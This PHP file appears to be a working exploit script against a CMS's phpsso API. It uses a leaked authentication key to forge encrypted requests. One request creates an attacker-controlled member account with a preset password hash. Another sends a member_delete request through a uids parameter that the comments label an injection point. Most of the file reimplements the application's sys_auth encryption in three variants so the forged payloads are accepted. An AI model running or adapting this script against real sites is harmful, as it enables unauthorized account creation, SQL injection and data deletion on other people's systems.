<?php
#error_reporting(0);
 
$url = $_GET['url'];
$key = $_GET['key'];
//$host = 'http://网站/';
//$auth_key = '爆的key';
//$string = "action=member_delete&uids=".$_GET['id']; //uids注入点
 
$host = "http://$url/";
$auth_key = "$key";
$string = "action=member_delete&uids=".$_GET['id']; //uids注入点
$strings = "action=member_add&uid=88888&random=333333&username=test123456&password=e445061346e44cc38d9f985836b9eac6&email=ffff@qq.com®ip=8.8.8.8";
 
$ecode = sys_auth($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
#echo $url;
$resp = file_get_contents($url);
echo $resp;
 
$ecode = sys_auth2($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth2($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
echo $resp;
 
$ecode = sys_auth3($strings,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
#echo $resp;
$ecode = sys_auth3($string,'ENCODE',$auth_key);
$url = $host."/api.php?op=phpsso&code=".$ecode;
$resp = file_get_contents($url);
echo $resp;
 
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
        $key_length = 4;
        $key = md5($key != '' ? $key : pc_base::load_config('system', 'auth_key'));
        $fixedkey = md5($key);
        $egiskeys = md5(substr($fixedkey, 16, 16));
        $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
        $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
        $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : 
 
base64_decode(strtr(substr($string, $key_length), '-_', '+/'));
 
        if($operation=='ENCODE'){
                $string .= substr(md5(microtime(true)), -4);
        }
        if(function_exists('mcrypt_encrypt')==true){
                $result=sys_auth_ex($string, $operation, $fixedkey);
        }else{
                $i = 0; $result = '';
                $string_length = strlen($string);
                for ($i = 0; $i < $string_length; $i++){
                        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
                }
        }
        if($operation=='DECODE'){
                $result = substr($result, 0,-4);
        }
         
        if($operation == 'ENCODE') {
                return $runtokey . rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
        } else {
                if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 
 
26).$egiskeys), 0, 16)) {
                        return substr($result, 26);
                } else {
                        return '';
                }
        }
}
 
function sys_auth_ex($string,$operation = 'ENCODE',$key) 
{ 
    $encrypted_data="";
    $td = mcrypt_module_open('rijndael-256', '', 'ecb', '');
 
    $iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND);
    $key = substr($key, 0, mcrypt_enc_get_key_size($td));
    mcrypt_generic_init($td, $key, $iv);
 
    if($operation=='ENCODE'){
        $encrypted_data = mcrypt_generic($td, $string);
    }else{
        $encrypted_data = rtrim(mdecrypt_generic($td, $string));
    }
    mcrypt_generic_deinit($td);
    mcrypt_module_close($td);
    return $encrypted_data;
}
 
function  sys_auth2($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
                $ckey_length = 4;
                $key = md5($key != '' ? $key : $this->ps_auth_key);
                $keya = md5(substr($key, 0, 16));
                $keyb = md5(substr($key, 16, 16));
                $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
 
                $cryptkey = $keya.md5($keya.$keyc);
                $key_length = strlen($cryptkey);
 
                $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + 
 
time() : 0).substr(md5($string.$keyb), 0, 16).$string;
                $string_length = strlen($string);
 
                $result = '';
                $box = range(0, 255);
 
                $rndkey = array();
                for($i = 0; $i <= 255; $i++) {
                        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
                }
 
                for($j = $i = 0; $i < 256; $i++) {
                        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
                        $tmp = $box[$i];
                        $box[$i] = $box[$j];
                        $box[$j] = $tmp;
                }
 
                for($a = $j = $i = 0; $i < $string_length; $i++) {
                        $a = ($a + 1) % 256;
                        $j = ($j + $box[$a]) % 256;
                        $tmp = $box[$a];
                        $box[$a] = $box[$j];
                        $box[$j] = $tmp;
                        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
                }
 
                if($operation == 'DECODE') {
                        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 
 
26).$keyb), 0, 16)) {
                                return substr($result, 26);
                        } else {
                                return '';
                        }
                } else {
                        return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
                }
        }
 
function sys_auth3($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
                $key_length = 4;
                $key = md5($key);
                $fixedkey = md5($key);
                $egiskeys = md5(substr($fixedkey, 16, 16));
                $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
                $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
                  
                $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : 
 
base64_decode(substr($string, $key_length));
                //10位密文过期信息+16位明文和密钥生成的密文验证信息+明文
                  
                $i = 0; $result = '';
                $string_length = strlen($string);
                for ($i = 0; $i < $string_length; $i++){
                  $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
                }
                  
                if($operation == 'ENCODE') {
                    return $runtokey . str_replace('=', '', base64_encode($result));
                } else {
                        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 
 
26).$egiskeys), 0, 16)) {
                          return substr($result, 26);
                        } else {
                          return '';
                        }
                }
    }
 
 
?>